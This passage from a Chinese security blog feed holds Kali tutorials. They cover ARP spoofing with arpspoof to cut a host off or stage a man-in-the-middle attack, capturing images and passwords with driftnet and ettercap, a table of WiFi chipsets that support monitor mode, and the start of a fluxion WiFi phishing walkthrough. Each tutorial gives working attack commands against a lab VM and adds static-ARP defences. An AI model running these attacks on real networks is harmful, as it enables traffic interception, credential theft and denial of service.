<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>博主目前只会处理靶机http协议的网页内容，对于https协议的网页，博主尝试了sslstrip+ettercap的解决方案。但是劫持了https之后，靶机访问https协议的网页会显示“无法建立安全连接”。感觉是证书的问题呀。大家有解决方案嘛？求助！！！<br>最后放几篇sslstrip+ettercap处理https协议网页的方案吧。方法都一样，大家可以借鉴。</p>
<p><a href="https://www.cnblogs.com/diligenceday/p/8076478.html#_label3">https://www.cnblogs.com/diligenceday/p/8076478.html#_label3</a><br><a href="https://www.cnblogs.com/h4ck0ne/p/5154688.html">https://www.cnblogs.com/h4ck0ne/p/5154688.html</a><br><a href="https://www.i0day.com/1238.html">https://www.i0day.com/1238.html</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
        <category>ettercap</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
        <tag>ettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>使用kali的arpspoof实现断网和中间人攻击</title>
    <url>/posts/ec81f3d6/</url>
    <content><![CDATA[<h2 id="注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负"><a href="#注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负" class="headerlink" title="注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负"></a>注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负</h2><h2 id="一、ARP协议介绍"><a href="#一、ARP协议介绍" class="headerlink" title="一、ARP协议介绍"></a>一、ARP协议介绍</h2><blockquote>
<p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p>
</blockquote>
<h2 id="二、ARP欺骗的条件和局限性"><a href="#二、ARP欺骗的条件和局限性" class="headerlink" title="二、ARP欺骗的条件和局限性"></a>二、ARP欺骗的条件和局限性</h2><p>1.局限性：</p>
<blockquote>
<p>只能攻击同一局域网下的主机</p>
</blockquote>
<p>2.攻击条件：</p>
<blockquote>
<p>攻击方要知道被攻击方的IP地址，以及被攻击方的网关地址攻击方和被攻击方处于同一局域网下</p>
</blockquote>
<h2 id="三、ARP欺骗原理"><a href="#三、ARP欺骗原理" class="headerlink" title="三、ARP欺骗原理"></a>三、ARP欺骗原理</h2><blockquote>
<p>ARP欺骗有两种攻击利用方式：<code>ARP欺骗断网攻击</code>和<code>ARP中间人攻击</code></p>
</blockquote>
<h3 id="3-1-ARP欺骗断网攻击"><a href="#3-1-ARP欺骗断网攻击" class="headerlink" title="3.1 ARP欺骗断网攻击"></a>3.1 ARP欺骗断网攻击</h3><p>1.概念</p>
<blockquote>
<p>ARP欺骗（英语：ARP spoofing），又称ARP毒化（ARP poisoning，网上上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网上特定计算机或所有计算机无法正常连线。</p>
</blockquote>
<p>2.主机型欺骗：</p>
<blockquote>
<p>攻击者欺骗受害主机，发送数据告诉受害主机说我是网关，然后受害主机会将攻击主机当作网关进行数据传输，这样就会导致受害主机无法正常上网。</p>
</blockquote>
<p>3.网关型欺骗：</p>
<blockquote>
<p>攻击者欺骗网关，发送数据告诉受网关，我是受害主机，网关将攻击主机当作受该机器进行数据传输，这样就会导致受害主机请求的数据发到攻击者主机。。</p>
</blockquote>
<h3 id="3-2-ARP中间人攻击"><a href="#3-2-ARP中间人攻击" class="headerlink" title="3.2 ARP中间人攻击"></a>3.2 ARP中间人攻击</h3><blockquote>
<p>攻击主机欺骗受害主机，发送数据告诉受害主机说我是网关，然后受害主机会将攻击主机当作网关进行数据传输。同时发送数据告诉网关说我是受害主机，网关会将攻击主机当作受害主机进行数据传输，这样受害主机和网关之间的数据交互都会经过攻击主机，受害主机不会断网不会察觉，所以可以查看到各种通信数据。</p>
</blockquote>
<h2 id="四、测试环境介绍"><a href="#四、测试环境介绍" class="headerlink" title="四、测试环境介绍"></a>四、测试环境介绍</h2><blockquote>
<p>攻击主机系统：<code>kali linux</code>：ip：<code>192.168.61.135</code><br>受害主机系统：<code>win10</code>：ip：<code>192.168.61.137</code></p>
</blockquote>
<h2 id="五、arpspoof介绍"><a href="#五、arpspoof介绍" class="headerlink" title="五、arpspoof介绍"></a>五、arpspoof介绍</h2><p>1.攻击工具：</p>
<blockquote>
<p>kali 中的arpspoof</p>
</blockquote>
<p>2.准备工具：</p>
<blockquote>
<p>打开kali,如果没安装arpspoof可以apt install 一下</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install arpspoof</span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/1.webp" alt="在这里插入图片描述"></p>
<p>3.工具介绍：</p>
<blockquote>
<p>arpspoof有四个参数：<br><code>-i</code> 表示网卡接口<br><code>-c</code> 表示主机信息，如果你的主机有多个IP，我的主机那个网卡上就一个IP<br><code>-t</code> 目标IP地址<br><code>-r</code> 目标网关地址</p>
</blockquote>
<h2 id="六、实战演示：ARP欺骗断网攻击"><a href="#六、实战演示：ARP欺骗断网攻击" class="headerlink" title="六、实战演示：ARP欺骗断网攻击"></a>六、实战演示：ARP欺骗断网攻击</h2><h3 id="6-1-获取受害机器IP-fping"><a href="#6-1-获取受害机器IP-fping" class="headerlink" title="6.1 获取受害机器IP-fping"></a>6.1 获取受害机器IP-fping</h3><blockquote>
<p>通过fping命令，查看当前局域网还存在那些主机，以确定要攻击的主机的ip地址</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -g 192.168.61.0/24</span><br></pre></td></tr></table></figure>

<blockquote>
<p>发现三台：一台是我的kali攻击机，一台是win10受害机，一台是网关</p>
</blockquote>
<p><img src="/img/arpspoof/2.webp" alt="在这里插入图片描述"></p>
<h3 id="6-2-获取受害机器IP-nmap"><a href="#6-2-获取受害机器IP-nmap" class="headerlink" title="6.2 获取受害机器IP-nmap"></a>6.2 获取受害机器IP-nmap</h3><blockquote>
<p>推荐使用nmap<br>发现只有一台机器可以当受害机器，192.168.61.138：也就是我的靶机win10</p>
</blockquote>
<p><img src="/img/arpspoof/3.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>192.168.61.1 vm8网卡<br>192.168.61.2 网关<br>192.168.61.138 靶机<br>192.168.61.254 DHCP服务器<br>192.168.61.135 kali本机</p>
</blockquote>
<h3 id="6-3-攻击前目标机器可正常上网"><a href="#6-3-攻击前目标机器可正常上网" class="headerlink" title="6.3 攻击前目标机器可正常上网"></a>6.3 攻击前目标机器可正常上网</h3><p><img src="/img/arpspoof/4.webp" alt="在这里插入图片描述"></p>
<h3 id="6-4-发起攻击"><a href="#6-4-发起攻击" class="headerlink" title="6.4 发起攻击"></a>6.4 发起攻击</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-i 网卡 -t 目标主机ip 网关ip</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.61.138 192.168.61.2</span><br><span class="line"><span class="comment">#对lan线网段所有ip攻击</span></span><br><span class="line">arpspoof -i eth0 192.168.61.2</span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/5.webp" alt="在这里插入图片描述"></p>
<h3 id="6-5-攻击期间目标机器可正常上网"><a href="#6-5-攻击期间目标机器可正常上网" class="headerlink" title="6.5 攻击期间目标机器可正常上网"></a>6.5 攻击期间目标机器可正常上网</h3><p><img src="/img/arpspoof/6.webp" alt="在这里插入图片描述"><br><img src="/img/arpspoof/7.webp" alt="在这里插入图片描述"></p>
<h2 id="七、实战演示：ARP中间人攻击（可截获图片和数据）"><a href="#七、实战演示：ARP中间人攻击（可截获图片和数据）" class="headerlink" title="七、实战演示：ARP中间人攻击（可截获图片和数据）"></a>七、实战演示：ARP中间人攻击（可截获图片和数据）</h2><h3 id="7-1-概述"><a href="#7-1-概述" class="headerlink" title="7.1 概述"></a>7.1 概述</h3><blockquote>
<p>这种情况就不能使受害主机断网，受害主机的IP流量经过攻击主机的时候，攻击主机应该对受害主机的IP流量进行转发。</p>
</blockquote>
<h3 id="7-2-Linux限制：开启路由转发"><a href="#7-2-Linux限制：开启路由转发" class="headerlink" title="7.2 Linux限制：开启路由转发"></a>7.2 Linux限制：开启路由转发</h3><blockquote>
<p>linux系统出于安全考虑禁止了IP转发功能，所以需要手动打开，在&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward里面数值是0，改为1就允许了IP转发<br>使用echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward实现该操作</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/8.webp" alt="在这里插入图片描述"></p>
<h3 id="7-3-实验"><a href="#7-3-实验" class="headerlink" title="7.3 实验"></a>7.3 实验</h3><h4 id="7-3-1-中间人攻击前目标机器可正常上网"><a href="#7-3-1-中间人攻击前目标机器可正常上网" class="headerlink" title="7.3.1 中间人攻击前目标机器可正常上网"></a>7.3.1 中间人攻击前目标机器可正常上网</h4><blockquote>
<p>此时机器可正常上网</p>
</blockquote>
<p><img src="/img/arpspoof/9.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>再查看物理地址，没有受到ARP欺骗攻击</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/10.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>路由追踪看一下跳跃节点，直接到达网关192.168.61.2</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tracert www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/11.webp" alt="在这里插入图片描述"></p>
<h4 id="7-3-2-发起中间人攻击"><a href="#7-3-2-发起中间人攻击" class="headerlink" title="7.3.2 发起中间人攻击"></a>7.3.2 发起中间人攻击</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.61.138 192.168.61.2</span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/12.webp" alt="在这里插入图片描述"></p>
<h4 id="7-3-3-中间人攻击期间目标机器可正常上网"><a href="#7-3-3-中间人攻击期间目标机器可正常上网" class="headerlink" title="7.3.3 中间人攻击期间目标机器可正常上网"></a>7.3.3 中间人攻击期间目标机器可正常上网</h4><blockquote>
<p>受害主机能正常上网</p>
</blockquote>
<p><img src="/img/arpspoof/13.webp" alt="在这里插入图片描述"></p>
<p><img src="/img/arpspoof/14.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>再次查看物理地址，MAC发生改变受到ARP欺骗攻击</p>
</blockquote>
<p><img src="/img/arpspoof/15.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>再次路由追踪看一下跳跃节点，发现到达一个中间节点之后才到达网关192.168.61.2</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tracert www.baidu.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>发现一个节点，但未捕获到IP，且这个节点在本机和网关之间</p>
</blockquote>
<p><img src="/img/arpspoof/16.webp" alt="在这里插入图片描述"></p>
<h4 id="7-3-4-driftnet工具捕获目标浏览的图片"><a href="#7-3-4-driftnet工具捕获目标浏览的图片" class="headerlink" title="7.3.4 driftnet工具捕获目标浏览的图片"></a>7.3.4 driftnet工具捕获目标浏览的图片</h4><blockquote>
<p>如果没有就进行安装：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install driftnet</span><br></pre></td></tr></table></figure>

<blockquote>
<p>出现一些有的没的错误，尝试一下换源<br>虚拟机中利用driftnet工具，可以捕获物理机正在浏览的图片。在kali中打开driftnet，即可得到受害机目前正在浏览的图片。<br>注意：这里只能看到HTTP页面的图片，无法查看HTTPS页面</p>
</blockquote>
<p><img src="/img/arpspoof/17.webp" alt="在这里插入图片描述"></p>
<h4 id="7-3-5-ettercap截取账号密码："><a href="#7-3-5-ettercap截取账号密码：" class="headerlink" title="7.3.5 ettercap截取账号密码："></a>7.3.5 ettercap截取账号密码：</h4><blockquote>
<p>借助于EtterCap嗅探软件，渗透测试人员可以检测网络内明文数据通讯的安全性，及时采取措施，避免敏感的用户名&#x2F;密码等数据以明文的方式进行传输。<br>在命令行输入：<br>ettercap -Tq -i eth0<br>-T 是 –text，文本模式；<br>-q 是 –quiet，安静，不显示包的内容。</p>
</blockquote>
<p><img src="/img/arpspoof/18.webp" alt="在这里插入图片描述"></p>
<h2 id="八、ARP攻击防范方式："><a href="#八、ARP攻击防范方式：" class="headerlink" title="八、ARP攻击防范方式："></a>八、ARP攻击防范方式：</h2><h3 id="8-1-防御方式"><a href="#8-1-防御方式" class="headerlink" title="8.1 防御方式"></a>8.1 防御方式</h3><h4 id="8-1-1-静态ARP绑定"><a href="#8-1-1-静态ARP绑定" class="headerlink" title="8.1.1 静态ARP绑定"></a>8.1.1 静态ARP绑定</h4><p>不同系统可能不一样，Windows如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh  -c  <span class="string">&quot;i  i&quot;</span> add neighbors  4  <span class="string">&quot;192.168.61.2&quot;</span> <span class="string">&quot;00-50-56-fe-9c-79&quot;</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h4 id="8-1-2-使用防火墙"><a href="#8-1-2-使用防火墙" class="headerlink" title="8.1.2 使用防火墙"></a>8.1.2 使用防火墙</h4><blockquote>
<p>1.使用ARP防火墙<br>2.使用可防御ARP攻击的核心交换机，绑定端口-MAC-IP</p>
</blockquote>
<h3 id="8-2-防御实战"><a href="#8-2-防御实战" class="headerlink" title="8.2 防御实战"></a>8.2 防御实战</h3><blockquote>
<p>这是我们确认的网关192.168.61.2的MAC：00-50-56-fe-9c-79<br>现在正在受到ARP攻击</p>
</blockquote>
<p><img src="/img/arpspoof/19.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>我们绑定静态arp<br>查看网卡：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh i  i show <span class="keyword">in</span></span><br></pre></td></tr></table></figure>

<p>绑定静态arp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh  -c  <span class="string">&quot;i  i&quot;</span> add neighbors  4  <span class="string">&quot;192.168.61.2&quot;</span> <span class="string">&quot;00-50-56-fe-9c-79&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/arpspoof/20.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>查看arp缓存表：绑定成功</p>
</blockquote>
<p><img src="/img/arpspoof/21.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>路由追踪直接跳到了192.168.61.2网关</p>
</blockquote>
<p><img src="/img/arpspoof/22.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>删除静态绑定</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh -c <span class="string">&quot;i  i&quot;</span> delete neighbors 4</span><br></pre></td></tr></table></figure>

<blockquote>
<p>又跳到了欺骗状态，动态MAC</p>
</blockquote>
<p><img src="/img/arpspoof/23.webp" alt="在这里插入图片描述"></p>
<h2 id="注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负-1"><a href="#注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负-1" class="headerlink" title="注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负"></a>注意：本文仅用于学习使用，切勿用于真实环境，否则，后果自负</h2>]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>支持在kali开启监听模式的USB无线网卡</title>
    <url>/posts/9e240c0c/</url>
    <content><![CDATA[<h1 id="抓包网卡收录"><a href="#抓包网卡收录" class="headerlink" title="抓包网卡收录"></a>抓包网卡收录</h1><p>Github上有一个叫USB-WiFi项目，里面统计了一些支持在Linux下开启监听模式的USB无线网卡。</p>
<blockquote>
<p>参考资料：<a href="https://github.com/morrownr/USB-WiFi/blob/main/home/USB_WiFi_Chipsets.md">https://github.com/morrownr/USB-WiFi/blob/main/home/USB_WiFi_Chipsets.md</a></p>
</blockquote>
<h2 id="USB-WiFi-chipset-information-for-Linux"><a href="#USB-WiFi-chipset-information-for-Linux" class="headerlink" title="USB WiFi chipset information for Linux"></a>USB WiFi chipset information for Linux</h2><p>Updated as of 2024-11-20. Expect further updates soon based on dramatic improvements to the rtw88 in-kernel series of drivers.</p>
<p>This document is a summary that includes information about many modern USB WiFi chipsets. If you see errors in this infomration, please post in Issues.</p>
<p>Not all USB WiFi adapters are created equally. While the chipset and driver dictate which WiFi features are supported (e.g. which frequency bands), the vendor of the adapter is free to decide on the performance of the antenna(s), the quality of the amp and whether the device requires mode switching and so on.</p>
<table>
<thead>
<tr>
<th>Chipset</th>
<th>Interface</th>
<th>Standard</th>
<th>Maximum Channel Width</th>
<th>Linux In-Kernel Driver</th>
<th>AP Mode</th>
<th>Monitor Mode</th>
<th>Recommended For Linux</th>
</tr>
</thead>
<tbody><tr>
<td>Mediatek MT7927</td>
<td>USB3</td>
<td>WiFi 7</td>
<td>320</td>
<td>pending</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Mediatek MT7925</td>
<td>USB3</td>
<td>WiFi 7</td>
<td>160</td>
<td>✔️ 6.7+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes [4]</td>
</tr>
<tr>
<td>Mediatek MT7922u</td>
<td>USB3</td>
<td>WiFi 6E</td>
<td>160</td>
<td>pending</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Realtek RTL8852cu</td>
<td>?</td>
<td>WiFi 6E</td>
<td>160</td>
<td>❌ [6]</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8832cu</td>
<td>USB3</td>
<td>WiFi 6E</td>
<td>160</td>
<td>❌</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Mediatek MT7921au</td>
<td>USB3</td>
<td>WiFi 6E</td>
<td>80</td>
<td>✔️ 5.18+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Realtek RTL8852bu</td>
<td>?</td>
<td>WiFi 6</td>
<td>80</td>
<td>❌ [6]</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8832bu</td>
<td>USB3</td>
<td>WiFi 6</td>
<td>80</td>
<td>❌</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8852au</td>
<td>?</td>
<td>WiFi 6</td>
<td>80</td>
<td>❌ - avoid [2]</td>
<td>bad driver</td>
<td>bad driver</td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8832au</td>
<td>USB3</td>
<td>WiFi 6</td>
<td>80</td>
<td>❌ - avoid</td>
<td>bad driver</td>
<td>bad driver</td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8814au</td>
<td>USB3</td>
<td>WiFi 5</td>
<td>80</td>
<td>❌ - avoid</td>
<td>old driver</td>
<td>old driver</td>
<td>No</td>
</tr>
<tr>
<td>Mediatek MT7662u</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 5.9+ [6]</td>
<td>✔️</td>
<td>✔️</td>
<td>No</td>
</tr>
<tr>
<td>Mediatek MT7612u</td>
<td>USB3</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 4.19+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Realtek RTL8822bu</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.2+ [3][6]</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8812bu</td>
<td>USB3</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.2+ [3]</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Realtek RTL8822cu</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.2+ [3][6]</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8812cu</td>
<td>USB3</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.2+ [3]</td>
<td></td>
<td></td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8812au</td>
<td>USB3</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.13+ [5]</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Mediatek MT7610u</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 4.19+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Realtek RTL8821cu</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.2+ [3][6]</td>
<td>✔️</td>
<td>✔️</td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8811cu</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.2+ [3]</td>
<td>✔️</td>
<td>✔️</td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8821au</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.13+ [5]</td>
<td>✔️</td>
<td>✔️</td>
<td>No</td>
</tr>
<tr>
<td>Realtek RTL8811au</td>
<td>USB2</td>
<td>WiFi 5</td>
<td>80</td>
<td>✔️ 6.13+ [5]</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Ralink RT3573</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 3.12+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Ralink RT5572</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 3.10+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Ralink RT3572</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 2.6.31+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Ralink RT5372</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 3.0+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Realtek RTL8192cu</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 2.6.33+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Mediatek MT7601u</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 4.2+</td>
<td>❌</td>
<td>limited</td>
<td>Yes</td>
</tr>
<tr>
<td>Ralink RT5370</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 3.0+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Atheros AR9271</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 2.6.35+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
<tr>
<td>Ralink RT3070</td>
<td>USB2</td>
<td>WiFi 4</td>
<td>40</td>
<td>✔️ 2.6.31+</td>
<td>✔️</td>
<td>✔️</td>
<td>Yes</td>
</tr>
</tbody></table>
<h2 id="Mediatek-MT7921AU-and-MT7922AU-in-kernel-driver-is-mt7921u-WiFi-6E"><a href="#Mediatek-MT7921AU-and-MT7922AU-in-kernel-driver-is-mt7921u-WiFi-6E" class="headerlink" title="Mediatek MT7921AU and MT7922AU (in-kernel driver is mt7921u) (WiFi 6E)"></a>Mediatek MT7921AU and MT7922AU (in-kernel driver is mt7921u) (WiFi 6E)</h2><p>Adapters based on the mt7921au chipset have been available since July of 2022.</p>
<p>[1] USB support added with the mt7921u driver in kernel 5.18. Internal cards are supported by the mt7921e driver which has been in the kernel since 5.12.</p>
<p>[2] AP mode support added to the mt7921u driver in kernel 5.19. Firmware update is required also.</p>
<hr>
<h2 id="Realtek-RTW88-in-kernel-driver-WiFi-5"><a href="#Realtek-RTW88-in-kernel-driver-WiFi-5" class="headerlink" title="Realtek RTW88 (in-kernel driver) (WiFi 5)"></a>Realtek RTW88 (in-kernel driver) (WiFi 5)</h2><p>[3] In-kernel support for the following chipsets is now in kernel 6.2 and later, however, it is strongly recommended that you use kernel 6.12 or later due to dramatic improvement to the drivers that have taken place during 2014:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rtl8822bu</span><br><span class="line">rtl8812bu (recommended)</span><br><span class="line">rtl8821cu</span><br><span class="line">rtl8811cu</span><br><span class="line">rtl8822cu</span><br><span class="line">rtl8812cu</span><br></pre></td></tr></table></figure>



<hr>
<p>[4] The driver for USB and PCIe went into Linux kernel 6.7. USB adapters should be available sometime this year.</p>
<p><a href="https://lwn.net/Articles/939966/">https://lwn.net/Articles/939966/</a></p>
<hr>
<p>[5] The new in-kernel drivers for the rtl8812au and rtl8821&#x2F;11au chips are NEW as of kernel 6.13.</p>
<hr>
<p>[6] Chipset has bluetooth turned on. Recommend Linux users avoid chipsets with bluetooth turned on.</p>
<h1 id="抓包软件使用"><a href="#抓包软件使用" class="headerlink" title="抓包软件使用"></a>抓包软件使用</h1><p>WinSniffer程序已进行了更新（v1.2），目前可以设置并捕获6G报文。</p>
<ul>
<li><strong>下载链接1（123云盘）：</strong><a href="https://www.123pan.com/s/rzBKVv-CvUP3.html">https://www.123pan.com/s/rzBKVv-CvUP3.html</a> 提取码：wdzx</li>
<li><strong>下载链接2（百度云盘）：</strong><a href="https://pan.baidu.com/s/1jvwskVyWh0UOszbhwvqIOA?pwd=wdzx">https://pan.baidu.com/s/1jvwskVyWh0UOszbhwvqIOA?pwd=wdzx</a> 提取码：wdzx</li>
</ul>
<h1 id="VMware虚拟机安装"><a href="#VMware虚拟机安装" class="headerlink" title="VMware虚拟机安装"></a>VMware虚拟机安装</h1><p>WinSniffer原理是将网卡连接到Linux虚拟机中，在Linux环境下开启网卡监听模式进行嗅探，再在Windows下使用Wireshark的远程抓包功能进行实时抓包。所以首先需要安装VMware虚拟机，版本建议在15.5或以上（如已安装可跳过此步）</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>利用fluxion进行WIFI钓鱼攻击</title>
    <url>/posts/418ef844/</url>
    <content><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. <strong>前言</strong></h4><blockquote>
<p><a href="https://github.com/FluxionNetwork/fluxion">Fluxion</a> 是一种安全审计和社会工程研究工具。它是 vk496 对 linset 的重制版，（希望）错误更少，功能更多。该脚本尝试通过社会工程（网络钓鱼）攻击从目标接入点检索 WPA&#x2F;WPA2 密钥。</p>
</blockquote>
<p>其原理是通过阻塞原始网络并创建一个虚假的钓鱼 WiFi，诱骗用户主动输入WiFi密码。相对于暴力可以更快速的获取 WiFi 密码</p>
<h4 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h4><ul>
<li>Kali 免驱无线网卡</li>
<li>Kali 虚拟机或实体机</li>
</ul>
<blockquote>
<p>Kali 免驱网卡可以直接在网上购买，注意问清楚商家 Kali 系统是否免驱，除了需要支持监听和注入功能，还需要支持 AP 功能（用于创建钓鱼 WiFi）。</p>
</blockquote>
<p><strong>Fluxion 支持的无线网卡：</strong></p>
<p><img src="/img/fluxion/1.webp" alt="img"></p>
<blockquote>
<p>Ralink RT3070L 也是支持的，它是 3070 的升级版本，理论上支持更高的传输速率。</p>
</blockquote>
<p>Kali Linux 下载地址：<a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></p>
<p><img src="/img/fluxion/2.webp" alt="img"></p>
<h4 id="3-安装-Fluxion"><a href="#3-安装-Fluxion" class="headerlink" title="3. 安装 Fluxion"></a>3. 安装 Fluxion</h4><p>切换到 root 用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>



<p>使用 git 命令克隆 Fluxion 项目到本地</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://www.github.com/FluxionNetwork/fluxion.git</span><br></pre></td></tr></table></figure>



<p>克隆完成后进入项目文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd fluxion</span><br></pre></td></tr></table></figure>



<p>运行 Fluxion</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./fluxion.sh</span><br></pre></td></tr></table></figure>



<p>Fluxion 会自动检查缺失的依赖，如果有缺失的依赖，使用下面的命令自动安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./fluxion.sh -i</span><br></pre></td></tr></table></figure>



<h4 id="4-抓取握手包"><a href="#4-抓取握手包" class="headerlink" title="4. 抓取握手包"></a>4. 抓取握手包</h4><p>输入 <code>18</code> 选择中文</p>
<p>输入 <code>2</code> 检索 WPA&#x2F;WPA2 加密散列</p>
